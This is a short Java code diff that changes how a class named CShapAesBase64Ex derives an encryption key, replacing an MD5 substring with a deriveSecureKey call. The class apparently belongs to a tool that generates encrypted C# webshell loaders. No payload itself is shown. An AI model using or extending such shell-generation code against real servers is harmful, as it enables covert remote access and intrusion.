@@ -81,6 +81,6 @@ public class CShapAesBase64Ex implements Cryption {
    }
 
    public byte[] generate(String password, String secretKey) {
-      return Generate.GenerateShellLoder("csharpShellEx", password, functions.md5(secretKey).substring(0, 16), false);
+      return Generate.GenerateShellLoder("csharpShellEx", password, functions.deriveSecureKey(secretKey), false);
    }
 }
